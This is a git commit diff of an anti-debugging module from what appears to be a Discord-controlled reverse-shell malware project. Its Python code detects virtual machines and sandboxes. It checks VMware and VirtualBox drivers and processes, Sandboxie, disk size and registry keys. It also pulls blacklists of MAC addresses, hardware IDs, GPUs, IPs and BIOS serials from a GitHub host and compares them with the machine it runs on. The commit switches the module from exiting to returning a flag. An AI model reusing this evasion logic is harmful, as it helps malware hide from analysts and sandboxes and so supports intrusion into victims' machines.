2ddd879a95053d89c22d93cbecd5c5a87760eccc
Josakko <112590914+Josakko@users.noreply.github.com>
2023-05-30 13:25:58 +0200

    Update antidebug.py

--- modules/antidebug.py
+++ modules/antidebug.py
@@ -4,27 +4,23 @@ import wmi
 import requests
 import os
 import ctypes
-import sys
+#import sys
 import subprocess
 import socket
 import psutil
 
     
 class Antidebug:
-    def __init__(self):
-        self.disk_check()
-        self.processes_check()
-        self.reg_check()
-        self.drivers_check()
-        self.profiles()
-        self.ip_check()
-        self.hwid_check()
-        self.gpu_check()
-        self.pc_check()
-        self.mac_check()
+    def main(self):
+        if self.disk_check():
+            return True
+        if self.processes_check() or self.reg_check() or self.drivers_check() or self.profiles() \
+        or self.ip_check() or self.hwid_check() or self.gpu_check() or self.pc_check() or self.mac_check():
+            return True
         
     
     def disk_check(self):
+        min_size = 60
         disks = []
         for i in psutil.disk_partitions(all=False):
             if os.name == 'nt' and ('cdrom' in i.opts or i.fstype == ''):
@@ -33,31 +29,31 @@ class Antidebug:
             disks.append((i.device, int(usage.total // (2**30))))
 
         for disk in disks:
-            if disk[0] == "C:\\" and disk[1] <= 50:
-                sys.exit(1)
+            if disk[0] == "C:\\" and disk[1] <= min_size:
+                return True
 
 
     def drivers_check(self):
         if os.path.exists(r"C:\WINDOWS\system32\drivers\vmci.sys"):
-            sys.exit(1)
+            return True
             
         if os.path.exists(r"C:\WINDOWS\system32\drivers\vmhgfs.sys"):
-            sys.exit(1)
+            return True
             
         if os.path.exists(r"C:\WINDOWS\system32\drivers\vmmouse.sys"):
-            sys.exit(1)
+            return True
             
         if  os.path.exists(r"C:\WINDOWS\system32\drivers\vmsci.sys"):
-            sys.exit(1)
+            return True
             
         if os.path.exists(r"C:\WINDOWS\system32\drivers\vmusbmouse.sys"):
-            sys.exit(1)
+            return True
             
         if os.path.exists(r"C:\WINDOWS\system32\drivers\vmx_svga.sys"):
-            sys.exit(1)
+            return True
             
         if os.path.exists(r"C:\WINDOWS\system32\drivers\VBoxMouse.sys"):
-            sys.exit(1)
+            return True
 
 
     def reg_check(self):
@@ -65,7 +61,7 @@ class Antidebug:
         reg1 = subprocess.run(cmd + "DriverDesc", shell=True, stderr=subprocess.DEVNULL)
         reg2 = subprocess.run(cmd + "ProviderName", shell=True, stderr=subprocess.DEVNULL)
         if reg1.returncode == 0 and reg2.returncode == 0:
-            sys.exit(1)
+            return True
 
 
     def processes_check(self):
@@ -79,48 +75,48 @@ class Antidebug:
                 processList.append(processNames.replace("K\n", "").replace("\n", ""))
 
         if "VMwareService.exe" in processList or "VMwareTray.exe" in processList:
-            sys.exit(1)
+            return True
                            
         if os.path.exists(vmware_dll): 
-            sys.exit(1)
+            return True
             
         if os.path.exists(virtualbox_dll):
-            sys.exit(1)
+            return True
         
         try:
             ctypes.cdll.LoadLibrary("SbieDll.dll")
-            sys.exit(1)
+            return True
         except:
             pass        
         
         processL = requests.get("https://raw.githubusercontent.com/Josakko/DiscordReverseShell/main/blacklist/process.txt").text
         if processL in processList:
-            sys.exit(1)
+            return True
             
             
     def mac_check(self):
         mac_address = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
         mac_list = requests.get("https://raw.githubusercontent.com/Josakko/DiscordReverseShell/main/blacklist/mac.txt").text
         if mac_address[:8] in mac_list:
-            sys.exit(1)
+            return True
             
             
     def pc_check(self):
         vm_name = os.getlogin()
         _vm_name = requests.get("https://raw.githubusercontent.com/Josakko/DiscordReverseShell/main/blacklist/pc_name.txt").text
         if vm_name in _vm_name:
-            sys.exit(1)
+            return True
         vm_username = requests.get("https://raw.githubusercontent.com/Josakko/DiscordReverseShell/main/blacklist/pc_username.txt").text
         host_name = socket.gethostname()
         if host_name in vm_username:
-            sys.exit(1)
+            return True
             
             
     def hwid_check(self):
         current_machine_id = str(subprocess.check_output('wmic csproduct get uuid'), 'utf-8').split('\n')[1].strip()
         hwid_vm = requests.get("https://raw.githubusercontent.com/Josakko/DiscordReverseShell/main/blacklist/hwid.txt").text
         if current_machine_id in hwid_vm:
-            sys.exit(1)
+            return True
             
             
     def gpu_check(self):
@@ -129,39 +125,44 @@ class Antidebug:
            GPUm = gpu.Description.strip()
         gpu_list = requests.get("https://raw.githubusercontent.com/Josakko/DiscordReverseShell/main/blacklist/gpu.txt").text
         if GPUm in gpu_list:
-            sys.exit(1)
+            return True
          
             
     def ip_check(self):
         ip_list = requests.get("https://raw.githubusercontent.com/Josakko/DiscordReverseShell/main/blacklist/ip.txt").text
         ip = requests.get("https://api.ipify.org").text
         if ip in ip_list:
-            sys.exit(1)
+            return True
            
             
-    def profiles():
+    def profiles(self):
         guid_pc = requests.get("https://raw.githubusercontent.com/Josakko/DiscordReverseShell/main/blacklist/guild.txt").text
         bios_guid = requests.get("https://raw.githubusercontent.com/Josakko/DiscordReverseShell/main/blacklist/bios_serial.txt").text
         baseboard_guid = requests.get("https://raw.githubusercontent.com/Josakko/DiscordReverseShell/main/blacklist/base_board_serial.txt").text
         serial_disk = requests.get("https://raw.githubusercontent.com/Josakko/DiscordReverseShell/main/blacklist/disk_drive_serial.txt").text
         
         machine_guid = uuid.getnode()
-        if machine_guid in guid_pc:
-            sys.exit(1)
+        if f"{machine_guid}" in guid_pc:
+            return True
         w = wmi.WMI()
         
         for bios in w.Win32_BIOS():
             bios_check = bios.SerialNumber
             if bios_check in bios_guid:
-                sys.exit(1) 
+                return True 
         
         for baseboard in w.Win32_BaseBoard():
             base_check = baseboard.SerialNumber
             if base_check in baseboard_guid:
-                sys.exit(1)
+                return True
                 
         for disk in w.Win32_DiskDrive():
             disk_serial = disk.SerialNumber
             if disk_serial in serial_disk:
-                sys.exit(1)
-                
+                return True
+
+
+#if Antidebug().main() is not None:
+#    sys.exit(1)
+#else:
+#    sys.exit(1)
